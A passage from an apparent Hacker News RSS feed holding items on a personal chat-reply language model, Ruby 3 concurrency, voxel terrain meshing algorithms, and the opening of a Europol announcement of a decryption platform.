<p>We are also excited about the prospect of a language model that is tailor-made for you, across all platforms. A single model that understands how you speak to strangers over mail, colleagues over Slack, and friends over chat. We want people to be able to control and experiment with their experience and run everything locally, as much as possible - since these are after all, your personal messages only read by a handful of corporations and government agencies.</p>
<h2 id="demo">Demo</h2>
<p><img src="https://raw.githubusercontent.com/nuwandavek/you/master/demo.gif" alt="Chat With Rishi"></p>
<h2 id="how-do-i-run-this">How do I run this?</h2>
<p>Currently You works on web Whatsapp, and running You involves 3 steps</p>
<ul>
<li>Training (fine-tuning) a pre-trained DistilGPT2 model on your own chats on Google Colab (or locally if you have a GPU)</li>
<li>Running a flask server with the model downloaded from the above step</li>
<li>Installing a Chrome/Firefox extension that talks to your server and injects the prompts to your browser</li>
</ul>
<p>For more detailed steps, checkout the  <code>README</code> file on the <a href="https://github.com/nuwandavek/you">github repository</a>.</p>
<h2 id="next-steps">Next Steps</h2>
<p>We have a bunch of ToDos on the <code>README</code>. Mostly we will be experimenting with new models or with better training strategies to improve the prompts. We’ll  also be working on supporting more chat and other communication applications.</p>
<p>This was a weekend project by <a href="https://twitter.com/nuwandavek">nuwandavek</a> and <a href="https://twitter.com/rishicomplex">rishicomplex</a>. Do check it out, and let us know how it goes!</p>

    </div></div>]]>
            </description>
            <link>https://vivekaithal.co/posts/you-complete-you/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690316</guid>
            <pubDate>Fri, 08 Jan 2021 20:52:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby 3, Concurrency and the Ecosystem]]>
            </title>
            <description>
<![CDATA[
Score 197 | Comments 47 (<a href="https://news.ycombinator.com/item?id=25690212">thread link</a>) | @ksec
<br/>
January 8, 2021 | https://kirshatrov.com/2021/01/06/ruby-concurrency-and-ecosystem/ | <a href="https://web.archive.org/web/*/https://kirshatrov.com/2021/01/06/ruby-concurrency-and-ecosystem/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p><span>06 Jan 2021</span></p><p>With the <a href="http://www.ruby-lang.org/en/news/2020/12/25/ruby-3-0-0-released/" target="\_blank">Ruby 3.0 release</a>, there’s been a lot of chatter about concurrency, parallelism, and async IO.</p>

<p>For my own reflection, I wanted to write down what that means for performance and capacity/costs of apps, and what would be the impact on the Ruby ecosystem.</p>

<p>I will assume that the audience already knows the difference between <a href="https://en.wikipedia.org/wiki/Thread_(computing)#Threads_vs._processes_pros_and_cons" target="\_blank">threads vs processes model in UNIX</a> and the <a href="https://en.wikipedia.org/wiki/Little%27s_law" target="\_blank">Little’s law</a>.</p>

<p>
Updated on Jan 9, 2021: thanks to the feedback from <a href="https://github.com/ioquatix" target="_blank">Samuel Williams</a>, I’ve revised the post with findings from <a href="https://github.com/socketry/falcon" target="_blank">Falcon</a>, the async web server written in Ruby.</p>

<h2 id="learning-from-python">Learning from Python</h2>

<p>It’s always good to take learnings from other languages. There’s an excellent <a href="http://calpaterson.com/async-python-is-not-faster.html" target="\_blank">write-up “Async Python is not faster” by Cal Paterson</a>.</p>

<p>It argues that process-based (aka forking) web servers <strong>show better latencies for web requests</strong> when they are compared to async IO-powered servers.</p>

<p>But why? That’s because async IO brings co-operative scheduling, which means that the execution is only yielded upon language keywords like <code>await</code>.</p>

<p>Quoting the author, this means that execution time is not distributed “fairly” and one thread can inadvertently starve another of CPU time while it is working. This is why latency is more erratic.</p>

<blockquote>
  <p>In contrast, traditional sync webservers use the pre-emptive multi-processing of the kernel scheduler, which works to ensure fairness by periodically swapping processes out from execution. This means that time is divided more fairly and that latency variance is lower.</p>
</blockquote>

<h2 id="learning-from-falcon">Learning from Falcon</h2>

<p>
(added on Jan 9, 2021)
</p>

<p><a href="https://github.com/socketry/falcon">Falcon</a> is a multi-process, multi-fiber HTTP server written in Ruby that is already utilizing async IO.</p>

<p>It has a great <a href="https://github.com/socketry/falcon-benchmark">set of benchmarks</a> that let us compare Falcon’s async IO with other non-async web servers like Passenger, Puma and Unicorn. Those benchmarks have been showing that <strong>async IO-powered server like Falcon</strong> provides better latencies on web requests.</p>

<p>Interestingly, that’s a very different story than Python! Looking at Python, I’ve expected that the thread driven server should be more “balanced” but it turns out the opposite.</p>

<p>Falcon’s authors explain that the fiber scheduler naturally scales according to load much better than the worker pool implementation in Puma. When fibers are busy handling requests, they don’t call <code>accept</code> so the requests are naturally picked up by other workers who are less busy.</p>

<h3 id="what-does-that-mean-for-us-ruby-developers">What does that mean for us Ruby developers?</h3>

<p>Scheduling threads and fibers is nuanced, and you can see that similar approaches demonstrate different results on Python and Ruby/Falcon examples.</p>

<p>In the first revision of this post, I’ve argued that async IO may often increase the latency. Thanks to the data <a href="https://github.com/socketry/falcon-benchmark">shown</a> by Samuel Williams, we can see that’s not the case.</p>

<p>One of the benefits of async IO is that concurrency is archived by the <code>yield</code>/<code>await</code> instruction, not by the constant interrupt of threads. Every interrupt causes the context switch - and it’s nice to reduce context switching where we can because scheduler switching from one task to another always adds a little overhead. Since that happens thousands of times every second, <strong>less context switching would mean fewer CPU cycles wasted</strong>.</p>

<h2 id="where-does-ractor-fit-in">Where does Ractor fit in?</h2>

<p>The Ractor pattern allows parallel execution (which wasn’t possible in Ruby before) of more than one Ruby thread by limiting the shared state of a block of code that you want to execute in parallel. Those “blocks of code” (aka “actors”) can also talk to each other through messages. This is the <a href="https://en.wikipedia.org/wiki/Actor_model">Actor model</a> used in other languages.</p>

<p>There are two ways we could leverage Ractors for modern apps: from the top (wrap every worker into a Ractor) and from the bottom (selectively use Ractors within existing code to parallelize CPU-intensive work).</p>

<p>While I see more to be gained from the top way, it seems like there’s so much shared and mutable state in Ruby libraries that it’s going to be quite tricky, although not impossible. It will likely take some efforts and at least a year of work from the community to push libraries towards less shared state. For the next year, we’ll mostly see Ractor maturing and getting adopted in the “bottom” use cases.</p>

<h2 id="impact-on-the-ruby-ecosystem">Impact on the Ruby ecosystem</h2>

<p><strong>By itself, async IO will help to use CPU more efficiently by reducing context switching.</strong></p>

<p>Better support for async IO in Ruby 3.0 will increase community’s adoption of async web servers like Falcon, and will hopefully give birth to async background job systems.</p>

<p>Having Sidekiq execute jobs concurrently through the async IO and event loop instead of threads could increase the throughput and save CPU work, especially for IO-bound workloads like webhook delivery.</p>

<p><strong>We’ll need to push the Ruby ecosystem to have less shared state to fully leverage the Ractor pattern.</strong> That will take us some time.</p>

<p>If you’ve enjoyed reading this, I highly recommend to read <em><a href="http://wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html" target="\_blank">Ruby 3.0 and the new FiberScheduler interface</a></em> by Wander Hillen.</p>

<p>Thanks to Samiel Williams and to Julik Tarkhanov for providing early feedback on this post.</p>

<p>I’m looking forward to hearing your thoughts on this in the comments!</p>

</div></div>]]>
            </description>
            <link>https://kirshatrov.com/2021/01/06/ruby-concurrency-and-ecosystem/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690212</guid>
            <pubDate>Fri, 08 Jan 2021 20:44:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Smooth Voxel Terrain, Part 2 (2012)]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25690189">thread link</a>) | @fanf2
<br/>
January 8, 2021 | https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/ | <a href="https://web.archive.org/web/*/https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<p><a href="https://0fps.wordpress.com/2012/07/10/smooth-voxel-terrain-part-1/">Last time</a> we formulated the problem of isosurface extraction and discussed some general approaches at a high level.&nbsp; Today, we’re going to get very specific and look at meshing in particular.</p>
<p>For the sake of concreteness, let us suppose that we have approximated our potential field <img src="https://s0.wp.com/latex.php?latex=f&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="f" title="f"> by sampling it onto a cubical grid at some fixed resolution.&nbsp; To get intermediate values, we’ll just interpolate between grid points using the standard <a href="http://paulbourke.net/miscellaneous/interpolation/">trilinear interpolation</a>.&nbsp; This is like a <img src="https://s0.wp.com/latex.php?latex=C%5E0&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="C^0" title="C^0"> generalization of Minecraft-style voxel surfaces.&nbsp; Our goal in this article is to figure out how to extract a mesh of the implicit surface (or zero-crossings of <img src="https://s0.wp.com/latex.php?latex=f&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="f" title="f">).&nbsp; In particular, we’re going to look at three different approaches to this problem:</p>
<h2>Marching Cubes</h2>
<p>By far the most famous method for extracting isosurfaces is the <a href="http://en.wikipedia.org/wiki/Marching_cubes">marching cubes</a> algorithm. &nbsp;In fact, it is so popular that the term `marching cubes’ is even more popular than the term `isosurface’ (at least according to Google)!&nbsp;&nbsp; It’s quite a feat when an algorithm becomes more popular than the problem which it solves!&nbsp; The history behind this method is very interesting.&nbsp; It was originally <a href="http://dl.acm.org/citation.cfm?id=37422">published back in SIGGRAPH 87</a>, and then summarily patented by the Lorensen and Cline. &nbsp;This fact has caused a lot of outrage, and is been widely cited as one of the classic examples of patents hampering innovation.&nbsp; Fortunately, the patent on marching cubes expired back in 2005 and so today you can freely use this algorithm in the US with no fear of litigation.</p>
<p>Much of the popularity of marching cubes today is due in no small part to a famous article written by <a href="http://paulbourke.net/">Paul Bourke</a>. &nbsp;Back in 1994 he made a webpage called <a href="http://paulbourke.net/geometry/polygonise/">“Polygonizing a Scalar Field”</a>, which presented a short, self-contained reference implementation of marching cubes (derived from some earlier work by Cory Gene Bloyd.)&nbsp; That tiny snippet of a C program is possibly <strong><em>the most copy-pasted code of&nbsp;<span>all time</span></em></strong>. &nbsp;I have seen some variation of Bloyd/Bourke’s code in <strong>every</strong> implementation of marching cubes that I’ve ever looked at, without exception.&nbsp; There are at least a couple of reasons for this:</p>
<ol>
<li>Paul Bourke’s exposition is really good. &nbsp;Even today, with many articles and tutorials written on the technique, none of them seem to explain it quite as well.&nbsp; (And I don’t have any delusions that I will do any better!)</li>
<li>Also their implementation is very small and fast. &nbsp;It uses some clever tricks like a precalculated edge table to speed up vertex generation.&nbsp; It is difficult to think of any non-trivial way to improve upon it.</li>
<li>Finally, marching cubes is incredibly difficult to code from scratch.</li>
</ol>
<p>This last point needs some explaining, &nbsp;Conceptually, marching cubes is rather simple. &nbsp;What it does is sample the implicit function along a grid, and then checks the sign of the potential function at each point (either +/-). &nbsp;Then, for every edge of the cube with a sign change, it finds the point where this edge intersects the volume and adds a vertex (this is just like ray casting a bunch of tiny little segments between each pair of grid points).&nbsp; The hard part is figuring out how to stitch some surface between these intersection points.&nbsp; Up to the position of the zero crossings, there are&nbsp;<img src="https://s0.wp.com/latex.php?latex=2%5E8+%3D+256&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="2^8 = 256" title="2^8 = 256"> different possibilities, each of which is determined by the sign of the function at the 8 vertices of the cube:</p>
<p><a href="http://en.wikipedia.org/wiki/File:MarchingCubes.svg"><img loading="lazy" data-attachment-id="561" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/marchingcubes/" data-orig-file="https://0fps.files.wordpress.com/2012/07/marchingcubes.png" data-orig-size="501,236" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="marchingcubes" data-image-description="<p>Some of the marching cubes special cases.  (c) WIkipedia, created by Jean-Marie Favreau.</p>
" data-medium-file="https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=501" title="marchingcubes" alt="" src="https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=300&amp;h=141" height="141" width="300" srcset="https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=300&amp;h=141 300w, https://0fps.files.wordpress.com/2012/07/marchingcubes.png?w=150&amp;h=71 150w, https://0fps.files.wordpress.com/2012/07/marchingcubes.png 501w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>Some of the marching cubes special cases. &nbsp;(c) Wikipedia, created by Jean-Marie Favreau.</p>
<p>Even worse, some of these cases are ambiguous!&nbsp; The only way to resolve this is to somewhat arbitrarily break the symmetry of the table based on a case-by-case analysis. What a mess!&nbsp; Fortunately, if you just download Bloyd/Bourke’s code, then you don’t have to worry about any of this and everything will just work. &nbsp;No wonder it gets used so much!</p>
<h2>Marching Tetrahedra</h2>
<p>Both the importance of isosurface extraction and the perceived shortcomings of marching cubes motivated the search for alternatives. &nbsp;One of the most popular was the <a href="http://search.ieice.org/bin/summary.php?id=e74-d_1_214">marching tetrahedra</a>, introduced by Doi and Koide.&nbsp; Besides the historical advantage that marching tetrahedra was not patented, it does have a few technical benefits:</p>
<ol>
<li>Marching tetrahedra does not have ambiguous topology, unlike marching cubes.&nbsp; As a result, surfaces produced by marching tetrahedra are always manifold.</li>
<li>The amount of geometry generated per tetrahedra is much smaller, which might make it more suitable for use in say a geometry shader.</li>
<li>Finally, marching tetrahedra has only <img src="https://s0.wp.com/latex.php?latex=2%5E4+%3D+16&amp;bg=ffffff&amp;fg=333333&amp;s=0&amp;c=20201002" alt="2^4 = 16" title="2^4 = 16"> cases, a number which can be further reduced to just 3 special cases by symmetry considerations. &nbsp;This is enough that you can work them out by hand.</li>
</ol>
<p><strong>Exercise:&nbsp; </strong>Try working out the cases for marching tetrahedra yourself. &nbsp;(It is really not bad.)</p>
<p>The general idea behind marching tetrahedra is the same as marching cubes, only it uses a tetrahedral subdivision. &nbsp;Again, the standard reference for practical implementation is Paul Bourke (<a href="http://local.wasp.uwa.edu.au/~pbourke/geometry/polygonise/">same page as before</a>, just scroll down a bit.) &nbsp;While there is a lot to like about marching tetrahedra, it does have some draw backs. &nbsp;In particular, the meshes you get from marching tetrahedra are typically about 4x larger than marching cubes. &nbsp;This makes both the algorithm and rendering about 4x slower. &nbsp;If your main consideration is performance, you may be better off using a cubical method. &nbsp;On the other hand, if you really need a manifold mesh, then marching tetrahedra could be a good option. &nbsp;The other nice thing is that if you are obstinate and like to code everything yourself, then marching tetrahedra may be easier since there aren’t too many cases to check.</p>
<h2>The Primal/Dual Classification</h2>
<p>By now, both marching cubes and tetrahedra are quite old. &nbsp;However, research into isosurface extraction hardly stopped in the 1980s.&nbsp; In the intervening years, many new techniques have been developed. &nbsp;One general class of methods which has proven very effective are the so-called `dual’ schemes. &nbsp;The first dual method, surface nets, was proposed by Sarah Frisken Gibson in 1999:</p>
<p>S.F. Gibson, (1999) “<a href="http://www.merl.com/papers/docs/TR99-24.pdf" target="_blank">Constrained Elastic Surface Nets</a>”&nbsp; Mitsubishi Electric Research Labs, Technical Report.</p>
<p>The main distinction between dual and primal methods (like marching cubes) is the way they generate surface topology.&nbsp; In both algorithms, we start with the same input: a volumetric mesh determined by our samples, which I shall take the liberty of calling a&nbsp;<em>sample complex</em> for lack of a better term.&nbsp; If you’ve never heard of the word&nbsp;<a href="http://www.inperc.com/wiki/index.php?title=Cell_complex">cell complex</a>&nbsp;before, you can think of it as an n-dimensional generalization of a triangular mesh, where the `cells’ or facets don’t have to be simplices.</p>
<p>In the sample complex, vertices (or 0-cells) correspond to the sample points; edges (1-cells) correspond to pairs of nearby samples; faces (2-cells) bound edges and so on:</p>
<p><img loading="lazy" data-attachment-id="534" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/samplecomplex/" data-orig-file="https://0fps.files.wordpress.com/2012/07/samplecomplex.png" data-orig-size="533,419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="samplecomplex" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=533" title="samplecomplex" alt="" src="https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=300&amp;h=235" height="235" width="300" srcset="https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=300&amp;h=235 300w, https://0fps.files.wordpress.com/2012/07/samplecomplex.png?w=150&amp;h=118 150w, https://0fps.files.wordpress.com/2012/07/samplecomplex.png 533w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>Here is an illustration of such a complex. &nbsp;I’ve drawn the vertices where the potential function is negative black, and the ones where it is positive white.</p>
<p>Both primal and dual methods walk over the sample complex, looking for those cells which cross the 0-level of the potential function. &nbsp;In the above illustration, this would include the following faces:</p>
<p><img loading="lazy" data-attachment-id="535" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/boundarycells/" data-orig-file="https://0fps.files.wordpress.com/2012/07/boundarycells.png" data-orig-size="533,419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="boundarycells" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=533" title="boundarycells" alt="" src="https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=300&amp;h=235" height="235" width="300" srcset="https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=300&amp;h=235 300w, https://0fps.files.wordpress.com/2012/07/boundarycells.png?w=150&amp;h=118 150w, https://0fps.files.wordpress.com/2012/07/boundarycells.png 533w" sizes="(max-width: 300px) 100vw, 300px"></p>
<h3>Primal Methods</h3>
<p>Primal methods, like marching cubes, try to turn the cells crossing the bounary into an isosurface using the following recipe:</p>
<ul>
<li>Edges crossing the boundary become vertices in the isosurface mesh.</li>
<li>Faces crossing the boundary become edges in the isosurface mesh.</li>
<li>…</li>
<li>n-cells crossing the boundary become (n-1)-cells in the isosurface mesh.</li>
</ul>
<p>One way to construct a primal mesh for our sample complex would be the following:</p>
<p><img loading="lazy" data-attachment-id="536" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/primalcomplex/" data-orig-file="https://0fps.files.wordpress.com/2012/07/primalcomplex.png" data-orig-size="533,424" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="primalcomplex" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=533" title="primalcomplex" alt="" src="https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=300&amp;h=238" height="238" width="300" srcset="https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=300&amp;h=238 300w, https://0fps.files.wordpress.com/2012/07/primalcomplex.png?w=150&amp;h=119 150w, https://0fps.files.wordpress.com/2012/07/primalcomplex.png 533w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>This is pretty nice because it is easy to find intersection points along edges. &nbsp;Of course, there is some topological ambiguity in this construction.&nbsp; For non-simplicial cells crossing the boundary it is not always clear how you would glue the cells together:</p>
<p><img loading="lazy" data-attachment-id="537" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/primalcell/" data-orig-file="https://0fps.files.wordpress.com/2012/07/primalcell.png" data-orig-size="929,198" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="primalcell" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/primalcell.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/primalcell.png?w=640" title="primalcell" alt="" src="https://0fps.files.wordpress.com/2012/07/primalcell.png?w=300&amp;h=63" height="63" width="300" srcset="https://0fps.files.wordpress.com/2012/07/primalcell.png?w=296&amp;h=63 296w, https://0fps.files.wordpress.com/2012/07/primalcell.png?w=591&amp;h=126 591w, https://0fps.files.wordpress.com/2012/07/primalcell.png?w=150&amp;h=32 150w, https://0fps.files.wordpress.com/2012/07/primalcell.png?w=300&amp;h=64 300w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>As we have seen, these ambiguities lead to exponentially many special cases, and are generally a huge pain to deal with.</p>
<h3>Dual Methods</h3>
<p>Dual methods on the other hand use a very different topology for the surface mesh.&nbsp; Like primal methods, they only consider the cells which intersect the boundary, but the rule they use to construct surface cells is very different:</p>
<ul>
<li>For every edge crossing the boundary, create an (n-1) cell.&nbsp; (Face in 3D)</li>
<li>For every face crossing the boundary, create an (n-2) cell. (Edge in 3D)</li>
<li>…</li>
<li>For every d-dimensional cell, create an (n-d) cell.</li>
<li>…</li>
<li>For every n-cell, create a vertex.</li>
</ul>
<p>This creates a much simpler topological structure:</p>
<p><img loading="lazy" data-attachment-id="538" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/dualcomplex/" data-orig-file="https://0fps.files.wordpress.com/2012/07/dualcomplex.png" data-orig-size="537,419" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="dualcomplex" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=537" title="dualcomplex" alt="" src="https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=300&amp;h=234" height="234" width="300" srcset="https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=300&amp;h=234 300w, https://0fps.files.wordpress.com/2012/07/dualcomplex.png?w=150&amp;h=117 150w, https://0fps.files.wordpress.com/2012/07/dualcomplex.png 537w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>The nice thing about this construction is that unlike primal methods, the topology of the dual isosurface mesh is completely determined by the sample complex (so there are no ambiguities).&nbsp; The disadvantage is that you may sometimes get non-manifold vertices:</p>
<p><img loading="lazy" data-attachment-id="465" data-permalink="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/dualmesh/" data-orig-file="https://0fps.files.wordpress.com/2012/07/dualmesh.png" data-orig-size="589,245" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;}" data-image-title="dualmesh" data-image-description="" data-medium-file="https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=300" data-large-file="https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=589" title="dualmesh" alt="" src="https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=300&amp;h=124" height="124" width="300" srcset="https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=298&amp;h=124 298w, https://0fps.files.wordpress.com/2012/07/dualmesh.png?w=150&amp;h=62 150w, https://0fps.files.wordpress.com/2012/07/dualmesh.png 589w" sizes="(max-width: 300px) 100vw, 300px"></p>
<h2>Make Your Own Dual Scheme</h2>
<p>To create your own dual method, you just have to specify two things:</p>
<ol>
<li>A sample complex.</li>
<li>And a rule to assign vertices to every n-cell intersecting the boundary.</li>
</ol>
<p>The second item is the tricky part, and much of the research into dual methods has focused on exploring the possibilities. &nbsp;It is interesting to note that this is the opposite of primal methods, where finding vertices was pretty easy, but gluing them together consistently turned out to be quite hard.</p>
<h3>Surface Nets</h3>
<p>Here’s a neat puzzle: what happens if we apply the dual recipe to a regular, cubical grid&nbsp;(like we did in marching cubes)? &nbsp;Well, it turns out that you get the same boxy, cubical meshes that you’d make in a Minecraft game (topologically speaking)!</p>
<p><a href="https://0fps.files.wordpress.com/2012/07/exampledualmesh.png"><img title="exampledualmesh" alt="" src="https://0fps.files.wordpress.com/2012/07/exampledualmesh.png?w=150&amp;h=145" height="145" width="150"></a><a href="https://0fps.files.wordpress.com/2012/07/spheresmoothed.png"><img title="spheresmoothed" alt="" src="https://0fps.files.wordpress.com/2012/07/spheresmoothed.png?w=150&amp;h=138" height="138" width="150"></a></p>
<p>Left: A dual mesh with vertex positions snapped to integer coordinates.&nbsp; Right: A dual mesh with smoothed vertex positions.</p>
<p>So if you know how to <a href="https://0fps.wordpress.com/2012/06/30/meshing-in-a-minecraft-game/">generate Minecraft meshes</a>, then you already know how to make smooth shapes! &nbsp;All you have to do is squish your vertices down onto the isosurface somehow. &nbsp;How cool is that?</p>
<p>This technique is called “surface nets” (remember when we mentioned them before?) &nbsp;Of course the trick is to figure out where you place the vertices. &nbsp;In Gibson’s original paper, she formulated the process of vertex …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/">https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/</a></em></p>]]>
            </description>
            <link>https://0fps.net/2012/07/12/smooth-voxel-terrain-part-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25690189</guid>
            <pubDate>Fri, 08 Jan 2021 20:43:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Europol launched an innovative decryption platform]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25690151">thread link</a>) | @tmkbry
<br/>
January 8, 2021 | https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement | <a href="https://web.archive.org/web/*/https://www.europol.europa.eu/newsroom/news/europol-and-european-commission-inaugurate-new-decryption-platform-to-tackle-challenge-of-encrypted-material-for-law-enforcement">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This week Europol launched an innovative decryption platform, developed in close cooperation with the <a href="https://ec.europa.eu/info/departments/joint-research-centre_en" target="_blank">European Commission's Joint Research Centre</a>. It will significantly increase Europol’s capability to decrypt information lawfully obtained in criminal investigations.</p>
<p>The launch of the new decryption platform marks a milestone in the fight against organised crime and terrorism in Europe. In full respect of fundamental rights and without limiting or weakening encryption, this initiative will be available to national law enforcement authorities of all Member States to help keep societies and citizens safe and secure. A virtual inauguration ceremony brought together senior representatives from Europol, the <a href="https://www.europarl.europa.eu/portal/en" target="_blank">European Parliament</a>, the <a href="https://www.consilium.europa.eu/en/" target="_blank">Council of the EU</a> and the <a href="https://ec.europa.eu/info/index_en" target="_blank">Commission</a>.</p>
<p>The event highlighted strong organisational cooperation within the EU and the considerable potential in innovation, research and development of the EU innovation hub for internal security.</p>
<p><strong>Ylva Johansson, EU Commissioner for Home Affairs</strong> said:</p>
<blockquote><p>This decryption platform will help police to investigate terrorism and serious and organised criminality. It will be important in the fight against online child sexual abuse. National police forces can now send lawfully obtained evidence to Europol for decryption.</p>
</blockquote>
<p>Addressing the event, <strong>Europol’s Executive Director Catherine De Bolle</strong> said:</p>
<blockquote><p>Today marks the end of a three-year-long journey. We have made a significant step forward in combating the criminal abuse of encryption with the aim of keeping our society and citizens safe while fully respecting fundamental rights. The new Europol Decryption Platform, funded by the European Commission, will allow us to further enhance our support for Member State investigations. This is the result of successful inter-organisational collaboration within the EU and shows the potential for further joint work and support for the EU innovation hub for internal security. I would like to express my gratitude to the Joint Research Centre for their strong partnership in this project.</p>
</blockquote>
<p>
Europol’s <a href="https://www.europol.europa.eu/about-europol/european-cybercrime-centre-ec3">European Cybercrime Centre (EC3)</a> will operate the platform and leverage its in-house expertise in providing the most effective support to national Member State investigations.<br>
